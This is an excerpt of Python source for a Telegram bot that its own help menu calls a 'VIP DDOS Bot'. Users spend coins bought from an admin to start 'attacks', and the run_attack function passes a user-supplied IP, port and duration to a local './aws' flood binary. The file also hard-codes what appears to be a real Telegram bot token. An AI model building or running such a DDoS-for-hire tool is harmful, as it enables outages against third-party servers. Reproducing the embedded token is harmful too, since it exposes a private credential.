...
TELEGRAM_BOT_TOKEN = '8179448288:AAHnMPYJlAuN6BdakNVIqh6FmvMjI0Ed2Dg'
...
async def attack(update: Update, context: CallbackContext):
    ...
    if user["coins"] < COINS_REQUIRED_PER_ATTACK:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*💰 Bhai, tere paas toh coins nahi hai! Pehle admin ke paas ja aur coins le aa. 😂 DM:- @Roxz_gaming*",
            parse_mode='Markdown'
        )
        return
...
async def run_attack(chat_id, ip, port, duration, context):
    ...
    try:
        command = f"./aws {ip} {port} {duration} {80} {921}"
...
async def help(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*🛠️ @Roxz_gaming VIP DDOS Bot Help Menu 🛠️*\n\n"
        ...
        "- *Agar koi dikkat aaye toh admin ko contact karo: @Roxz_gaming*\n\n"
